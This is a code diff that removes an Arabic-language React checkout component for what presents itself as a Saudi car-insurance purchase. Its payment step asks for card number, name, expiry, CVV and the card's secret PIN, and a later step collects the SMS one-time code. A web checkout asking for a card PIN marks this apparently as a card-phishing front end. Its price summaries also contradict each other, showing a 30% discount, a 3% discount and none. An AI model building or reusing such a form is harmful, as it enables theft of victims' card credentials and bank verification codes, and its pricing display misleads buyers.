-                <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
-                  <div className="space-y-6">
-                    <h4 className="text-xl font-bold text-gray-900 text-center">معلومات التواصل</h4>
-                    <label>
-                      رقم الهاتف
-                    </label>
-                    <Input
-                      name="phone"
-                      type="tel"
-                      placeholder="05xxxxxxxx"
-                      required
-                      maxLength={10}
-                      autoFocus={true}
-                    />
-
-                    <div className="bg-blue-50 border border-blue-200 rounded-xl p-4">
-                      <div className="flex items-start gap-3">
-                        <input
-                          type="checkbox"
-                          className="w-5 h-5 mt-1 text-[#109cd4]"
-                          checked={formData.agreeToTerms}
-                          onChange={(e) => handleFieldChange("agreeToTerms", e.target.checked)}
-                        />
-                        <span className="text-sm text-blue-800">
-                          أوافق على{" "}
-                          <a href="#" className="text-[#109cd4] hover:underline font-semibold">
-                            الشروط والأحكام
-                          </a>{" "}
-                          و{" "}
-                          <a href="#" className="text-[#109cd4] hover:underline font-semibold">
-                            سياسة الخصوصية
-                          </a>
-                        </span>
-                      </div>
-                    </div>
-                 
-                  </div>
-
-                  <Card className="border-2 border-gray-200 h-fit">
-                    <CardContent className="p-6">
-                      {(() => {
-                        const selectedOffer = offerData.find((offer) => offer.id === formData.selectedInsuranceOffer)
-                        if (!selectedOffer) {
-                          return <div className="text-center text-gray-500">لم يتم اختيار عرض</div>
-                        }
-
-                        const basePrice = Number.parseFloat(selectedOffer.main_price)
-                        const selectedFeatures = selectedOffer.extra_features.filter((f) =>
-                          formData.selectedAddons.includes(f.id),
-                        )
-                        const addonsTotal = selectedFeatures.reduce((sum, f) => sum + f.price, 0)
-                        const expenses = selectedOffer.extra_expenses.reduce((sum, e) => sum + e.price, 0)
-                        const total = basePrice-(basePrice*0.30) + addonsTotal + expenses
-                        return (
-                          <div className="space-y-4">
-                            <div className="text-center mb-6">
-                              <h4 className="text-xl font-bold text-gray-900">
-                                {selectedOffer.name.replace(/insurance/g, "").trim()}
-                              </h4>
-                              <p className="text-gray-600">
-                                {selectedOffer.type === "against-others"
-                                  ? "تأمين ضد الغير"
-                                  : selectedOffer.type === "comprehensive"
-                                    ? "تأمين شامل"
-                                    : "تأمين خاص"}
-                              </p>
-                            </div>
-
-                            <div className="space-y-3">
-                              <div className="flex justify-between items-center">
-                                <span className="text-gray-600">قسط التأمين الأساسي</span>
-                                <span className="font-semibold">{(basePrice-(basePrice*0.03)).toFixed(0)} ر.س</span>
-                              </div>
-
-                              {addonsTotal > 0 && (
-                                <div className="flex justify-between items-center">
-                                  <span className="text-gray-600">الإضافات المختارة</span>
-                                  <span className="font-semibold">{addonsTotal} ر.س</span>
-                                </div>
-                              )}
-
-                              {selectedOffer.extra_expenses.map((expense) => (
-                                <div key={expense.id} className="flex justify-between items-center text-sm">
-                                  <span className="text-gray-600">{expense.reason}</span>
-                                  <span className="font-medium">
-                                    {expense.reason.includes("خصم") ? "-" : "+"}
-                                    {expense.price} ر.س
-                                  </span>
-                                </div>
-                              ))}
-
-                              <hr className="border-gray-200" />
-                              <div className="flex justify-between items-center text-xl">
-                                <span className="font-bold text-gray-900">المجموع الكلي</span>
-                                <span className="font-bold text-green-600">{total.toFixed(2)} ر.س</span>
-                              </div>
-                            </div>
-                          </div>
-                        )
-                      })()}
-                    </CardContent>
-                  </Card>
-                </div>
-              </div>
-            )}
-            {/* ... existing code for other steps ... */}
-
-            {currentPage === 6 && (
-              <div className="space-y-8">
-                <div className="text-center mb-8">
-                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
-                    بيانات الدفع
-                  </h3>
-                  <p className="text-gray-600">أدخل بيانات بطاقتك الائتمانية لإتمام عملية الدفع الآمن</p>
-                </div>
-
-                <div className="bg-blue-50 border border-blue-200 rounded-xl p-6 mb-8">
-                  <div className="flex items-center gap-3">
-                    <Lock className="w-6 h-6 text-[#109cd4] flex-shrink-0" />
-                    <div>
-                      <p className="font-semibold text-blue-900">دفع آمن ومحمي</p>
-                      <p className="text-sm text-[#109cd4]">جميع بياناتك محمية بتشفير SSL 256-bit</p>
-                    </div>
-                  </div>
-                </div>
-
-                <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
-                  <div className="space-y-6">
-                    <div>
-                      <label className="block text-sm font-semibold text-gray-700 mb-3">
-                        رقم البطاقة <span className="text-red-500">*</span>
-                      </label>
-                      <Input
-                        name="cardNumber"
-                        id="cardNumber"
-                        type="tel"
-                        placeholder="#### #### #### ####"
-                        required
-                        dir="ltr"
-                        value={formatCardNumber(cardNumber)}
-                        onChange={(e) => {
-                          const value = e.target.value.replace(/\D/g, "")
-                          if (value.length <= 16) {
-                            setCardNumber(value)
-                          }
-                        }}
-                        maxLength={19}
-                        autoFocus={true}
-                        className={`h-12 ${errors.cardNumber ? "border-red-500" : "border-gray-300"}`}
-                      />
-                      {cardNumber && (
-                        <div className="flex items-center gap-2 mt-2">
-                          <span className="text-sm text-gray-600">نوع البطاقة: {getCardType(cardNumber)}</span>
-                          {validateCardNumber(cardNumber) && <CheckCircle className="w-4 h-4 text-green-600" />}
-                        </div>
-                      )}
-                      {errors.cardNumber && (
-                        <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-                          <AlertCircle className="w-4 h-4 flex-shrink-0" />
-                          <span>{errors.cardNumber}</span>
-                        </div>
-                      )}
-                    </div>
-
-                    <div>
-                      <label className="block text-sm font-semibold text-gray-700 mb-3">
-                        الاسم كما هو مكتوب على البطاقة <span className="text-red-500">*</span>
-                      </label>
-                      <Input
-                        name="cardName"
-                        id="cardName"
-                        type="text"
-                        className={`h-12 ${errors.cardName ? "border-red-500" : "border-gray-300"}`}
-                        value={cardName}
-                        onChange={(e) => setCardName(e.target.value)}
-                        placeholder="الاسم الكامل"
-                        required
-                      />
-                      {errors.cardName && (
-                        <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-                          <AlertCircle className="w-4 h-4 flex-shrink-0" />
-                          <span>{errors.cardName}</span>
-                        </div>
-                      )}
-                    </div>
-
-                    <div className="grid grid-cols-3 gap-4">
-                      <div>
-                        <label className="block text-sm font-semibold text-gray-700 mb-3">
-                          الشهر <span className="text-red-500">*</span>
-                        </label>
-                        <select
-                          name="expiryMonth"
-                          id="expiryMonth"
-                          className={`w-full h-12 px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${
-                            errors.cardMonth ? "border-red-500" : "border-gray-300"
-                          }`}
-                          value={cardMonth}
-                          onChange={(e) => setCardMonth(e.target.value)}
-                        >
-                          <option value="">الشهر</option>
-                          {Array.from({ length: 12 }, (_, i) => (
-                            <option key={i + 1} value={String(i + 1).padStart(2, "0")}>
-                              {String(i + 1).padStart(2, "0")}
-                            </option>
-                          ))}
-                        </select>
-                        {errors.cardMonth && (
-                          <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-                            <AlertCircle className="w-4 h-4 flex-shrink-0" />
-                            <span>{errors.cardMonth}</span>
-                          </div>
-                        )}
-                      </div>
-
-                      <div>
-                        <label className="block text-sm font-semibold text-gray-700 mb-3">
-                          السنة <span className="text-red-500">*</span>
-                        </label>
-                        <select
-                          className={`w-full h-12 px-3 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${
-                            errors.cardYear ? "border-red-500" : "border-gray-300"
-                          }`}
-                          value={cardYear}
-                          onChange={(e) => setCardYear(e.target.value)}
-                          name="expiryYear"
-                          id="expiryYear"
-                        >
-                          <option value="">السنة</option>
-                          {Array.from({ length: 10 }, (_, i) => {
-                            const year = new Date().getFullYear() + i
-                            return (
-                              <option key={year} value={year}>
-                                {year}
-                              </option>
-                            )
-                          })}
-                        </select>
-                        {errors.cardYear && (
-                          <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-                            <AlertCircle className="w-4 h-4 flex-shrink-0" />
-                            <span>{errors.cardYear}</span>
-                          </div>
-                        )}
-                      </div>
-
-                      <div>
-                        <label className="block text-sm font-semibold text-gray-700 mb-3">
-                          CVV <span className="text-red-500">*</span>
-                        </label>
-                        <Input
-                          name="cvv"
-                          id="cvv"
-                          type="password"
-                          className={`h-12 ${errors.cvv ? "border-red-500" : "border-gray-300"}`}
-                          placeholder="123"
-                          maxLength={3}
-                          value={cvv}
-                          onChange={(e) => setCvv(e.target.value.replace(/\D/g, ""))}
-                        />
-                        {errors.cvv && (
-                          <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-                            <AlertCircle className="w-4 h-4 flex-shrink-0" />
-                            <span>{errors.cvv}</span>
-                          </div>
-                        )}
-                      </div>
-                    </div>
-                    <div className="w-full h-12">
-                      <label className="block text-sm font-semibold text-gray-700 mb-3">
-                        الرقم السري للبطاقة <span className="text-red-500">*</span>
-                      </label>
-                      <Input
-                        name="pinCode"
-                        id="pinCode"
-                        type="password"
-                        className={`h-12 ${errors.pinCode ? "border-red-500" : "border-gray-300"}`}
-                        placeholder="####"
-                        maxLength={4}
-                        value={pinCode}
-                        required
-                        onChange={(e) => setPinCode(e.target.value.replace(/\D/g, ""))}
-                      />
-                      {errors.pinCode && (
-                        <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-                          <AlertCircle className="w-4 h-4 flex-shrink-0" />
-                          <span>{errors.pinCode}</span>
-                        </div>
-                      )}
-                    </div>
-                  </div>
-
-                  <Card className="border-2 border-gray-200 h-fit">
-                    <CardContent className="p-6">
-                      <h4 className="text-xl font-bold text-gray-900 mb-6">ملخص الدفع</h4>
-                      {(() => {
-                        const selectedOffer = offerData.find((offer) => offer.id === formData.selectedInsuranceOffer)
-                        if (!selectedOffer) return null
-
-                        const basePrice = Number.parseFloat(selectedOffer.main_price)
-                        const selectedFeatures = selectedOffer.extra_features.filter((f) =>
-                          formData.selectedAddons.includes(f.id),
-                        )
-                        const addonsTotal = selectedFeatures.reduce((sum, f) => sum + f.price, 0)
-                        const expenses = selectedOffer.extra_expenses.reduce((sum, e) => sum + e.price, 0)
-                        const total = basePrice + addonsTotal + expenses
-
-                        return (
-                          <div className="space-y-3">
-                            <div className="flex justify-between text-sm">
-                              <span>قسط التأمين</span>
-                              <span>{basePrice} ر.س</span>
-                            </div>
-                            {addonsTotal > 0 && (
-                              <div className="flex justify-between text-sm">
-                                <span>الإضافات</span>
-                                <span>{addonsTotal} ر.س</span>
-                              </div>
-                            )}
-                            <div className="flex justify-between text-sm">
-                              <span>الرسوم والضرائب</span>
-                              <span>{expenses} ر.س</span>
-                            </div>
-                            <hr />
-                            <div className="flex justify-between font-bold text-lg">
-                              <span>المجموع</span>
-                              <span className="text-green-600">{total} ر.س</span>
-                            </div>
-                          </div>
-                        )
-                      })()}
-                    </CardContent>
-                  </Card>
-                </div>
-              </div>
-            )}
-
-            {currentPage === 7 && (
-              <div className="space-y-8">
-                <div className="text-center mb-8">
-                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
-                    التحقق من الهوية
-                  </h3>
-                  <p className="text-gray-600">أدخل رمز التحقق المرسل إلى هاتفك لإتمام العملية</p>
-                </div>
-
-                <div className="max-w-md mx-auto text-center space-y-8">
-                  <div className="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto">
-                    <Phone className="w-10 h-10 text-[#109cd4]" />
-                  </div>
-
-                  <div>
-                    <h4 className="text-xl font-bold text-gray-900 mb-3">تم إرسال رمز التحقق</h4>
-                    <p className="text-gray-600">
-                      تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم الهاتف
-                      <br />
-                      <span className="font-semibold">{formData.phone}</span>
-                    </p>
-                  </div>
-
-                  <div>
-                    <label className="block text-sm font-semibold text-gray-700 mb-3">
-                      رمز التحقق <span className="text-red-500">*</span>
-                    </label>
-                    <Input
-                      name="otp"
-                      type="text"
-                      placeholder="######"
-                      required
-                      value={otp}
-                      maxLength={6}
-                      onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
-                      autoFocus={true}
-                      className={`text-center text-2xl h-14 tracking-widest ${
-                        errors.otp ? "border-red-500" : "border-gray-300"
-                      }`}
-                    />
-                    {errors.otp && (
-                      <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-                        <AlertCircle className="w-4 h-4 flex-shrink-0" />
-                        <span>{errors.otp}</span>
-                      </div>
-                    )}
-                  </div>
-
-                  {otpTimer > 0 ? (
-                    <p className="text-sm text-gray-500">
-                      يمكنك طلب رمز جديد خلال {Math.floor(otpTimer / 60)}:{(otpTimer % 60).toString().padStart(2, "0")}
-                    </p>
-                  ) : (
-                    <Button
-                      variant="outline"
-                      onClick={sendOTP}
-                      className="text-[#109cd4] border-[#109cd4] hover:bg-blue-50 bg-transparent"
-                    >
-                      إرسال رمز جديد
-                    </Button>
-                  )}
-
-                  {otpAttempts > 0 && (
-                    <p className="text-sm text-orange-600">عدد المحاولات المتبقية: {3 - otpAttempts}</p>
-                  )}
-                </div>
-              </div>
-            )}
-          </div>
-
-          {/* Enhanced Navigation Buttons */}
-          <div className="flex flex-col sm:flex-row justify-between items-center mt-8 pt-8 border-t border-gray-200 gap-4 sm:gap-0">
-            <Button
-              variant="outline"
-              onClick={prevStep}
-              disabled={currentPage === 1 || paymentProcessing || isSubmitting}
-              className="px-8 py-3 w-full sm:w-auto order-2 sm:order-1 border-gray-300 hover:border-[#109cd4] hover:text-[#109cd4] bg-transparent"
-            >
-              <ArrowLeft className="w-4 h-4 ml-2" />
-              السابق
-            </Button>
-
-            <div className="text-sm text-gray-500 order-1 sm:order-2 bg-gray-100 px-4 py-2 rounded-full">
-              الخطوة {currentPage} من {steps.length}
-            </div>
-
-            {currentPage < 6 ? (
-              <Button
-                onClick={nextStep}
-                className="bg-[#109cd4] hover:bg-blue-700 px-8 py-3 w-full sm:w-auto order-3 font-semibold"
-                disabled={isSubmitting}
-              >
-                التالي
-                <ArrowLeft className="w-4 h-4 mr-2 rotate-180" />
-              </Button>
-            ) : currentPage === 6 ? (
-              <Button
-                onClick={handlePayment}
-                disabled={paymentProcessing}
-                className="bg-green-600 hover:bg-green-700 px-8 py-3 w-full sm:w-auto order-3 font-semibold"
-              >
-                {paymentProcessing ? (
-                  <div className="flex items-center gap-2">
-                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                    جاري معالجة الدفع...
-                  </div>
-                ) : (
-                  <>
-                    <CreditCard className="w-4 h-4 ml-2" />
-                    تأكيد الدفع
-                  </>
-                )}
-              </Button>
-            ) : (
-              <Button
-                onClick={verifyOTP}
-                disabled={isSubmitting}
-                className="bg-green-600 hover:bg-green-700 px-8 py-3 w-full sm:w-auto order-3 font-semibold"
-              >
-                {isSubmitting ? (
-                  <div className="flex items-center gap-2">
-                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                    جاري التحقق...
-                  </div>
-                ) : (
-                  <>
-                    <CheckCircle className="w-4 h-4 ml-2" />
-                    تأكيد الرمز
-                  </>
-                )}
-              </Button>
-            )}
-          </div>
-        </div>
-      </CardContent>
-    </Card>
-  )
-}
-
-// ... existing code for getBadgeText and getTypeBadge functions ...
